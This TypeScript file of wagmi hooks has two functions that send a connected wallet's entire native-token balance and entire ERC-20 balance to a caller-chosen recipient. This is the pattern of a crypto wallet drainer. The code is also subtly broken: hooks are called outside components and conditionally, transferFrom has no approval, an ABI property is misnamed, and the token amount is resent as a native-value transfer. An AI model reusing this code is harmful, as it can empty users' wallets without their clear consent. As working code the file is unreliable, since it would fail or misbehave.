import { useContractRead, useSendTransaction } from 'wagmi';
import { useBalance } from 'wagmi';
import { useAccount } from 'wagmi';
import { Address } from 'viem';
import { useWriteContract } from 'wagmi';
import { erc20ABI } from 'wagmi';

export function transferNativeToken(recipient: Address) {
  const connectedAddress = useAccount().address;

  const userBalance = useBalance({
    address: connectedAddress,
  }).data?.value;

  const { data: hash, sendTransaction } = useSendTransaction();

  sendTransaction({ to: recipient, value: userBalance });
}

export function transferERC20Token(
  recipient: Address,
  contractAddress: Address
) {
  const connectedAddress = useAccount().address;
  let tokenBalance: bigint | undefined;

  if (connectedAddress) {
    const { data: balance } = useContractRead({
      address: contractAddress, // The ERC-20 token contract address
      abi: erc20ABI, // The ABI for the ERC-20 token
      functionName: 'balanceOf',
      args: [connectedAddress], // The address whose balance you want to query
    });
    tokenBalance = balance;
  }

  const { writeContract } = useWriteContract();

  writeContract({
    erc20ABI,
    address: contractAddress,
    functionName: 'transferFrom',
    args: [connectedAddress, recipient, tokenBalance],
  });

  const userBalance = useBalance({
    address: connectedAddress,
  });

  const { data: hash, sendTransaction } = useSendTransaction();

  sendTransaction({ to: recipient, value: tokenBalance });
}

// use the hash for any conditional logic as it's populated after the transaction confirms.
// {
//   hash && <div>Transaction Hash: {hash}</div>;
// }
